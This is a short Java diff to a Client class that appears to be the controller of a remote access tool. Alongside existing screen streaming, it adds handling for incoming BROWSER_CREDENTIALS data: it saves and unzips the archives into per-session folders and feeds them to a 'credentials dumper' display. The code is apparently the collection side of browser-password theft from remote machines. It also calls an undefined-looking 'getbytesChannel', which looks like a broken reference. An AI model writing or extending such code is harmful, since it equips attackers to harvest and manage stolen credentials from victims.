@@ -17,6 +17,7 @@ import java.util.Map;
 import java.util.concurrent.ConcurrentHashMap;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
+import java.util.concurrent.Future;
 import java.util.function.Consumer;
 
 public class Client {
@@ -61,6 +62,11 @@ public class Client {
             case SCREEN_STREAMING -> {
                 updater.updateFrameOfScreenStreamer(finalData);
                 bytesChannel.getBuffer().clear();
+            }
+            case BROWSER_CREDENTIALS -> {
+                writeFile(finalData, bytesChannel.getCategoryOutputFolder());
+                closeFileChannel(bytesChannel.getId());
+                updater.updateCredentialsDumper(getbytesChannel);
             }
         }
         // closeFileChannel(bytesChannel.getId());
@@ -120,6 +126,14 @@ public class Client {
         Path pathOfDownload = Path.of(getSessionFolder(), finalNameOfFolder);
         FileWriterTask task = new FileWriterTask(data, pathOfDownload.toString());
         executor.execute(task);
+    }
+
+    public String unzipCredentialsAndGetPath(byte[] data, String category) {
+        String finalNameOfFolder = category + " - " + new Time().getTime();
+        Path pathOfDownload = Path.of(getSessionFolder(), finalNameOfFolder);
+        FileWriterTask task = new FileWriterTask(data, pathOfDownload.toString());
+        task.unzipFileInMemory();
+        return pathOfDownload.toString();
     }
 
 
